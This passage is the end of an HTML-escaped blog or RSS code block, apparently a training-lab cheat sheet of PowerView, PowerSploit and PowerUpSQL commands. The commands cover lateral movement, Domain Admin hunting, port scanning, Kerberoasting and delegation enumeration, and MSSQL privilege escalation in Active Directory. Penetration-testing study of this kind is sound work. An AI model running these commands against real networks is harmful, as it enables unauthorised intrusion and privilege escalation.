&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start to move laterally/escalate privileges&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccessCreds&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT01&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># User Hunting (default: Domain Admins)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-CheckAccess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Port Scanning (PowerSploit)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Privilege Escalation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="c"># Kerberoasting&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Unconstrained&lt;/span> &lt;span class="c"># Unconstrained delegation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="c"># ASREPRoasting (PowerView_dev)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span> &lt;span class="c"># Constrained delegation (user)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span> &lt;span class="c"># Constrained delegation (computer)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Look for interesting MSSQL instance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfoThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLEscalatePriv&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item></channel></rss>